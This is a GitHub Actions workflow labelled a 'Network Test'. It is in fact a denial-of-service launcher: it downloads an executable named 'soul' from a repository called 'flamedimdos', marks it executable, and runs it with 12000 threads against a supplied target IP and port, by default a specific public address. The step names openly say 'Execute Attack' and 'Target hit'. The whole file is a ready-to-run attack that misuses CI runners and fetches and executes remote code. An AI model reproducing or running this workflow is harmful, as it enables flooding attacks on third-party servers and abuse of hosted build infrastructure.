name: "Network Test 9"

on:
  workflow_dispatch:
    inputs:
      target_ip:
        description: "Target IP"
        required: true
        default: "20.219.7.150"
      target_port:
        description: "Target Port"
        required: true
        default: "26133"
      duration:
        description: "Test Duration"
        required: true
        default: "120"

jobs:
  network-test:
    runs-on: ubuntu-latest
    timeout-minutes: 12
    
    steps:
    - name: "ğŸ”§ Setup Environment"
      run: |
        echo "ğŸš€ Starting Network Test"
        echo "ğŸ¯ Target: ${{ inputs.target_ip }}:${{ inputs.target_port }}"
        echo "â±ï¸ Duration: ${{ inputs.duration }} seconds"
        echo "ğŸ’¥ Threads: 12000"
        echo "ğŸ”§ Binary Source: URL"

    - name: "ğŸ“¥ Download Binary from URL"
      run: |
        wget -O soul "https://raw.githubusercontent.com/flamedimdos-a11y/Nnn/main/soul"
        chmod +x soul
        echo "âœ… Binary downloaded from URL"
        ls -la

    - name: "âš¡ Execute Attack - FULL DURATION"
      run: |
        echo "ğŸ”¥ STARTING ATTACK - Will run for ${{ inputs.duration }} seconds"
        timeout ${{ inputs.duration }} ./soul "${{ inputs.target_ip }}" "${{ inputs.target_port }}" "${{ inputs.duration }}" "12000" || echo "âœ… Attack completed after full duration"
        echo "ğŸ¯ ATTACK FINISHED - Target hit for ${{ inputs.duration }} seconds"
